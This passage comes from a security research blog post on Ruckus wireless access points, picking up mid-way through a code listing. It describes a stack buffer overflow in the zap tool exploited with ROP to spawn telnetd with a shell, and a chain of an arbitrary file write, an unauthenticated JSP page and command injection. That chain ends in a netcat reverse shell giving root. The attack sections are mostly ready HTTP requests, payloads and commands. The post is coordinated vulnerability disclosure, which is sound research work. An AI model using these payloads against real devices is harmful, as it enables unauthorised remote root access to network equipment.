		<span class="k">if</span> <span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="sc">','</span> <span class="p">)</span> <span class="p">{</span>
			<span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="sc">' '</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="cm">/*Get debug file name*/</span>
	<span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="p">(</span> <span class="kt">int</span> <span class="p">)</span><span class="n">strlen</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">);</span> <span class="n">j</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="sc">' '</span> <span class="p">)</span> <span class="p">{</span>
			<span class="n">config</span><span class="o">-&gt;</span><span class="n">debugfile</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">j</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">));</span>
			<span class="n">strncpy</span><span class="p">(</span><span class="n">config</span><span class="o">-&gt;</span><span class="n">debugfile</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">j</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
			<span class="n">config</span><span class="o">-&gt;</span><span class="n">debugfile</span><span class="p">[</span><span class="n">j</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="cm">/*Get the start point*/</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
	<span class="k">for</span> <span class="p">(</span> <span class="n">k</span> <span class="o">=</span> <span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="p">(</span> <span class="kt">int</span> <span class="p">)</span><span class="n">strlen</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">);</span> <span class="n">k</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">==</span> <span class="sc">' '</span> <span class="p">)</span> <span class="p">{</span>
			<span class="kt">char</span> <span class="n">temp</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">len: %d-%d=%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="n">j</span><span class="p">,</span><span class="n">k</span><span class="p">,</span><span class="n">j</span><span class="p">,</span> <span class="n">k</span><span class="o">-</span><span class="n">j</span><span class="p">);</span>
			<span class="n">strncpy</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="n">j</span><span class="p">,</span> <span class="n">k</span><span class="o">-</span><span class="n">j</span><span class="p">);</span>
			<span class="n">value</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">temp</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="cm">/*Get end point*/</span>
	<span class="k">for</span> <span class="p">(</span> <span class="n">k</span> <span class="o">=</span> <span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="p">(</span> <span class="kt">int</span> <span class="p">)</span><span class="n">strlen</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">);</span> <span class="n">k</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">==</span> <span class="sc">' '</span> <span class="p">)</span> <span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="o">+</span><span class="mi">1</span><span class="p">]);</span>
			<span class="k">if</span> <span class="p">(</span> <span class="n">sscanf</span><span class="p">(</span> <span class="o">&amp;</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span> <span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stop_value</span> <span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
				<span class="c1">// Bad scan..</span>
				<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">break</span><span class="p">;</span>
</code></pre></div></div>
<p>Here is the code that parses the “-D” argument. Let’s see what it does. First, it replaces all commas with spaces. Then it copies every segment to a temp buffer. Since it expects numbers, it uses a very small buffer. There was an attempt to secure the code by using <code class="language-plaintext highlighter-rouge">strncpy</code>. However, it used the entire string length for n. So it doesn’t protect this string copy and we were able to smash the stack.</p>
<p>Since we were in control of zap’s arguments, we could pass an original argument, followed by “-D” with an overflow payload.</p>
<h2 id="stack-overflow-exploit-cve-2019-19840">Stack overflow exploit: <span class="cve-critical" title="Stack buffer overflow in zap executable"><a href="/vulns/aleph-2019010">CVE-2019-19840</a></span></h2>
<p>R510 runs on an ARMv7 architecture, with NX and ASLR enabled. To overcome NX we decided to use ROP gadgets.</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/tools/_cmdstat.jsp</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded charset=UTF-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">473</span>

&lt;ajax-request action='docmd' xcmd='wc' updater='system.1568118269965.3208' comp='zapd'&gt;
&lt;xcmd cmd='wc' comp='zapd' wcid=1 client='1.1.1.1' tool='zap-up' zap-type='udp' server='1.1.1.2 -D/tmp/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0A2p������p���5Ad6$r��d8Ad9Ae0Ae1A3Ae4Ae5Ae6A,e7AeCCCCDDDD������������f5Af6Af7,CCCC,telnetd,-l/bin/sh,-p12345' syspmtu=65500 /&gt;
&lt;/ajax-request&gt;
</code></pre></div></div>
<p>Both gadget were found in libc:</p>
<ul>
<li>Gadget 1 - sub sp, fp, #0x14 ; pop {r4, r5, r6, r7, fp, pc}</li>
<li>Gadget 2 - mov r0, r4 ; pop {r4, pc}</li>
<li>system()</li>
</ul>
<p>As for ASLR - since zap is forked from emfd we used a brute force approach to overcome its 9 bit of randomness.</p>
<p>That is the second way to own this R510 AP.</p>
<h1 id="third-attack-scenario">Third Attack Scenario:</h1>
<p>This attack scenario includes an arbitrary file write using the <code class="language-plaintext highlighter-rouge">zap</code> executable (<span class="cve-critical" title="Remote code execution vulnerability via zap"><a href="/vulns/aleph-2019006">CVE-2019-19836</a></span>). It can create a new <code class="language-plaintext highlighter-rouge">jsp</code> page, that does not require authentication and is vulnerable to command injection (<span class="cve-critical" title="Remote command injection via a crafted HTTP request (cmdImportAvpPort)"><a href="/vulns/aleph-2019008">CVE-2019-19838</a></span>, <span class="cve-critical" title="Remote command injection via a crafted HTTP request (cmdImportCategory)"><a href="/vulns/aleph-2019009">CVE-2019-19839</a></span>, <span class="cve-critical" title="Remote command injection via a crafted HTTP request (cmdPacketCapture)"><a href="/vulns/aleph-2019011">CVE-2019-19841</a></span>, <span class="cve-critical" title="Remote command injection via a crafted HTTP request (cmdSpectraAnalysis)"><a href="/vulns/aleph-2019012">CVE-2019-19842</a></span>).</p>
<h2 id="command-injection">Command injection:</h2>
<p>Let us understand how <code class="language-plaintext highlighter-rouge">emfd</code> executes shell commands. <code class="language-plaintext highlighter-rouge">emfd</code> uses 6 different functions to execute shell commands. Some of them are direct calls to functions in libc, such as system(), popen(), and execve(). Others call a wrapper that runs a shell script handler. This diversity in shell execution calls indicates that a bug, such as a command injection, might be feasible.</p>
<p><img src="/assets/img/ruckus/image18.png" alt="" /></p>
<p>From the above functions, <code class="language-plaintext highlighter-rouge">system()</code> is the easiest one to exploit. It also appears to have a high reference count (107). Our goal was to find a function that calls <code class="language-plaintext highlighter-rouge">system()</code> in a way that we can control its argument. Here are 4 functions that met this criteria: cmdSpectraAnalysis() <span class="cve-critical" title="Remote command injection via a crafted HTTP request (cmdSpectraAnalysis)"><a href="/vulns/aleph-2019012">CVE-2019-19842</a></span>, cmdImportAvpPort() <span class="cve-critical" title="Remote command injection via a crafted HTTP request (cmdImportAvpPort)"><a href="/vulns/aleph-2019008">CVE-2019-19838</a></span>, cmdImportCatagory() <span class="cve-critical" title="Remote command injection via a crafted HTTP request (cmdImportCategory)"><a href="/vulns/aleph-2019009">CVE-2019-19839</a></span>, and cmdPacketCapture() <span class="cve-critical" title="Remote command injection via a crafted HTTP request (cmdPacketCapture)"><a href="/vulns/aleph-2019011">CVE-2019-19841</a></span>. All 4 functions are reachable from <code class="language-plaintext highlighter-rouge">doCommand()</code> via <code class="language-plaintext highlighter-rouge">AjaxCmdStat()</code>, with the same mechanism described in scenario two.</p>
<p>However, they all depend on a request to <code class="language-plaintext highlighter-rouge">/admin/_cmdstat.jsp</code> page. This page checks for session authentication</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="nx">squashfs</span><span class="o">-</span><span class="nx">root</span> <span class="nx">cat</span> <span class="nx">web</span><span class="o">/</span><span class="nx">admin</span><span class="o">/</span><span class="nx">_cmdstat</span><span class="p">.</span><span class="nx">jsp</span> 
<span class="o">&lt;%</span>
<span class="nx">Delegate</span><span class="p">(</span><span class="dl">"</span><span class="s2">SessionCheck</span><span class="dl">"</span><span class="p">,</span> <span class="nx">session</span><span class="p">[</span><span class="dl">"</span><span class="s2">cid</span><span class="dl">"</span><span class="p">],</span> <span class="dl">'</span><span class="s1">true</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">httpReq</span> <span class="o">=</span> <span class="nx">request</span><span class="p">[</span><span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nx">httpReq</span><span class="p">.</span><span class="nx">HTTP_X_CSRF_TOKEN</span><span class="o">==</span><span class="nx">session</span><span class="p">[</span><span class="dl">"</span><span class="s2">cid</span><span class="dl">"</span><span class="p">]</span>
	<span class="o">||</span> <span class="nx">httpReq</span><span class="p">.</span><span class="nx">HTTP_X_CSRF_TOKEN</span><span class="o">==</span><span class="dl">'</span><span class="s1">61a18965-f473-4f3b-97b1-4651d63b23fa</span><span class="dl">'</span> 
	<span class="o">||</span> <span class="nx">session</span><span class="p">[</span><span class="dl">"</span><span class="s2">isFactory</span><span class="dl">"</span><span class="p">]</span><span class="o">==</span><span class="dl">'</span><span class="s1">true</span><span class="dl">'</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nx">Delegate</span><span class="p">(</span><span class="dl">"</span><span class="s2">AjaxCmdStat</span><span class="dl">"</span><span class="p">,</span> <span class="nx">session</span><span class="p">[</span><span class="dl">"</span><span class="s2">cid</span><span class="dl">"</span><span class="p">]);</span>
<span class="p">}</span>
<span class="o">%&gt;</span>
</code></pre></div></div>
<p>If the session is valid, all 4 functions should be vulnerable. We would like to focus on <code class="language-plaintext highlighter-rouge">cmdImportAvpPort()</code> for this article.</p>
<p><img src="/assets/img/ruckus/image7.png" alt="" /></p>
<p>Decompiling revealed that the <code class="language-plaintext highlighter-rouge">uploadFile</code> attribute is obtained from the request XML, and inserted into the <code class="language-plaintext highlighter-rouge">command</code> variable without sanitation. Any command injection payload should work here.</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/tools/_cmdstat.jsp</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded charset=UTF-8</span>
<span class="na">X-CSRF-Token</span><span class="p">:</span> <span class="s">oaMM8EBv1Y</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">225</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">-ejs-session-=x236a14bd195e0f136942005c785bac52</span>

&lt;ajax-request action='docmd' xcmd='get-platform-depends' updater='system.1568118269965.3208' comp='system'&gt;
        &lt;xcmd cmd='import-avpport' uploadFile='; echo "inject" &gt;/tmp/steroids'  type='wlan-maxnums'/&gt;
&lt;/ajax-request&gt;
</code></pre></div></div>
<p>Notice that a valid cookie and CSRF token are needed. We wanted to overcome this authentication requirement. If we could write a new page that calls <code class="language-plaintext highlighter-rouge">Delegate("AjaxCmdStat", session["cid"]);</code> without conditions or session checks, it would meet the requirement. To write this kind of page, we needed an arbitrary file write vulnerability, and a writeable directory to write in <code class="language-plaintext highlighter-rouge">/web</code>.</p>
<h2 id="arbitrary-file-write">Arbitrary file write:</h2>
<p>We discovered from the second scenario that we could pass unintended arguments to the <code class="language-plaintext highlighter-rouge">zap</code> executable, without the need for authentication. The argument <code class="language-plaintext highlighter-rouge">-L</code> tells <code class="language-plaintext highlighter-rouge">zap</code> where to write its logfile, and it has no path limitations. Therefore, we could write a file to any location we wanted. But we still didn’t have full control over the written content. The log’s structure still limited us. Let us observe how <code class="language-plaintext highlighter-rouge">zap_pkg_drop_dump_file()</code> in <code class="language-plaintext highlighter-rouge">zap.c</code> writes a log file. It looks like this:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fileio</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span> <span class="n">config</span><span class="o">-&gt;</span><span class="n">logfile</span><span class="p">,</span> <span class="s">"r"</span> <span class="p">);</span>
<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">fileio</span> <span class="p">)</span> <span class="p">{</span>
	<span class="n">new_file</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	<span class="n">new_file</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">fclose</span><span class="p">(</span> <span class="n">fileio</span> <span class="p">);</span>
<span class="p">}</span>

<span class="n">fileio</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span> <span class="n">config</span><span class="o">-&gt;</span><span class="n">logfile</span><span class="p">,</span> <span class="s">"a+"</span> <span class="p">);</span>

<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">fileio</span> <span class="p">)</span> <span class="p">{</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">stderr</span><span class="p">,</span> <span class="s">"Error, file probably open by another application.</span><span class="se">\n</span><span class="s">"</span> <span class="p">);</span>
	<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Dump package drop information.</span>
<span class="k">if</span> <span class="p">(</span> <span class="n">new_file</span> <span class="p">)</span> <span class="p">{</span>
	<span class="c1">// If a new file, make the first row have text tags for all the columns</span>

	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Zap Version%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Filename%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Protocol%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>

	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Invert Open%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Tx IP%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Rx IP%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Multicast%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"ToS%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>

	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Samples%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Sample Size%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Payload Length%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Payload Transmit Delay%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>

	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Payloads Received%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Payloads Dropped%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Payloads Repeated%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Payloads Outoforder%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>

	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Date%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Notes%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Tag%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"Sub Tag%c"</span><span class="p">,</span> <span class="n">delimit</span> <span class="p">);</span>

	<span class="n">fprintf</span><span class="p">(</span> <span class="n">fileio</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Luckily, <code class="language-plaintext highlighter-rouge">config-&gt;note</code>, <code class="language-plaintext highlighter-rouge">config-&gt;tag</code>, and <code class="language-plaintext highlighter-rouge">config-&gt;sub</code> are all settable with arguments -N, -T, and -S respectively. We could use the same method to pass <code class="language-plaintext highlighter-rouge">-T</code> and <code class="language-plaintext highlighter-rouge">-S</code> as well.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zap <span class="nt">-s192</span>.168.0.1 <span class="nt">-d192</span>.168.0.2 <span class="nt">-R</span> <span class="nt">-L</span>/web/uploaded/index.jsp <span class="nt">-T</span>&lt;%Delegate<span class="o">(</span><span class="s2">"AjaxCmdStat"</span> <span class="nt">-Ssession</span><span class="o">[</span><span class="s2">"cid"</span><span class="o">])</span><span class="p">;</span>%&gt; <span class="nt">-X14</span> <span class="nt">-q0xa0</span> <span class="nt">-p50000</span> <span class="nt">-l65444</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">zap</code> writes to the log file only if it creates a successful connection to a <code class="language-plaintext highlighter-rouge">zapd</code> server. That means we had to create a <code class="language-plaintext highlighter-rouge">zapd</code> server that answers to <code class="language-plaintext highlighter-rouge">zap</code>. Fortunately, <code class="language-plaintext highlighter-rouge">zapd.c</code> sources are also available online, and we successfully compiled it. After setting <code class="language-plaintext highlighter-rouge">zap</code> to our <code class="language-plaintext highlighter-rouge">zapd</code> server, we were able to write a page:</p>
<h2 id="writeable-directory">Writeable directory:</h2>
<p>Lastly, we had to find a writeable directory in <code class="language-plaintext highlighter-rouge">/web</code>. Since <code class="language-plaintext highlighter-rouge">/web</code> is part of the <code class="language-plaintext highlighter-rouge">squashfs</code> file system, it is a read-only directory. Thankfully, we could write to <code class="language-plaintext highlighter-rouge">/web/uploaded</code>, since it’s symbolically linked to <code class="language-plaintext highlighter-rouge">/writable/etc/airespider</code></p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  squashfs-root <span class="nb">ls</span> <span class="nt">-lath</span> web/uploaded
lrwxrwxrwx 1 wave wave 24 Apr 15  2019 web/uploaded -&gt; /etc/airespider/uploaded
➜  squashfs-root <span class="nb">ls</span> <span class="nt">-lath</span> etc/airespider
lrwxrwxrwx 1 wave wave 24 Apr 15  2019 etc/airespider -&gt; /writable/etc/airespider
</code></pre></div></div>
<h2 id="page-write">Page write:</h2>
<p>Finally, we had all we needed to write a new <code class="language-plaintext highlighter-rouge">jsp</code> page to the web interface. That page contains an <code class="language-plaintext highlighter-rouge">ejs</code> call to our command injection vulnerability function. As previously mentioned in the article, even though every <code class="language-plaintext highlighter-rouge">jsp</code> page has a related <code class="language-plaintext highlighter-rouge">mod</code> file, it is not needed to get the ejs handler to execute the <code class="language-plaintext highlighter-rouge">jsa</code> page. Now we could create a vulnerable page in <code class="language-plaintext highlighter-rouge">/uploaded/index.jsp</code></p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/tools/_rcmdstat.jsp</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded charset=UTF-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">304</span>

&lt;ajax-request action='docmd' xcmd='wc' updater='system.1568118269965.3208' comp='zapd'&gt;
	&lt;xcmd cmd='wc' comp='zapd' wcid=1 client='192.168.0.1' tool='zap-up' zap-type='udp' server='192.168.0.2 -R -L/web/uploaded/index.jsp -T&lt;%Delegate("AjaxCmdStat" -Ssession["cid"]);%&gt;' syspmtu=65500 /&gt;
&lt;/ajax-request&gt;
</code></pre></div></div>
<p>This request results in following page creation:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruckus$ cat /web/uploaded/index.jsp 
Zap Version,Filename,Protocol,Invert Open,Tx IP,Rx IP,Multicast,ToS,Samples,Sample Size,Payload Length,Payload Transmit Delay,Payloads Received,Payloads Dropped,Payloads Repeated,Payloads Outoforder,Date,Notes,Tag,Sub Tag,
1.83.19,/web/uploaded/index.jsp,udp,Off,192.168.0.2:192.168.0.2,192.168.0.1:192.168.0.1,Off,A0h,1000000,100,65444,1,92,7,0,0,Fri Mar 15 17:09:04 2019,,&lt;%Delegate("AjaxCmdStat",session["cid"]);%&gt;,
</code></pre></div></div>
<p>All there is left is to send our command injection to <code class="language-plaintext highlighter-rouge">/uploaded/index.jsp</code></p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/uploaded/index.jsp</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded charset=UTF-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">261</span>

&lt;ajax-request action='docmd' xcmd='get-platform-depends' updater='system.1568118269965.3208' comp='system'&gt; 
	&lt;xcmd cmd='import-avpport' uploadFile=';rm /tmp/b;mknod /tmp/b p;/bin/sh 0&lt;/tmp/b|nc 192.168.0.2 4444 1&gt;/tmp/b'  type='wlan-maxnums'/&gt;
&lt;/ajax-request&gt;
</code></pre></div></div>
<p>And listen for our reverse shell:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  squashfs-root nc <span class="nt">-vlp</span> 4444
Listening on <span class="o">[</span>0.0.0.0] <span class="o">(</span>family 0, port 4444<span class="o">)</span>
Connection from 192.168.0.1 49117 received!

<span class="nb">echo</span> <span class="nv">$USER</span>
root
</code></pre></div></div>
<p>That is the third way to own this AP.</p>
<h1 id="conclusions">Conclusions:</h1>
<p>This vulnerability research was exciting. It involved all sorts of different vulnerabilities. Chaining some of them together was challenging yet useful. This research was also an excellent opportunity to check our docker emulation environment. It proved itself to be very useful. Ruckus Wireless has been informed about these vulnerabilities. Ruckus Unleashed AP 200.7.10.202.92 should fix them. Since Ruckus has other attack surfaces, we might conduct follow up research.</p>
<p><a href="https://www.ruckuswireless.com/security/299/view/txt">Ruckus Security Advisory</a></p>
</div>
</div>
<br>
<div id="disqus_thread"></div>
<script>
/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/

var disqus_config = function () {
this.page.url = 'https://alephsecurity.com/2020/01/14/ruckus-wireless/';  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = '/2020/01/14/ruckus-wireless'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};

(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = '//alephsecurity.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<script id="dsq-count-scr" src="//alephsecurity.disqus.com/count.js" async></script>
</div>
</div>
</body>
</html>
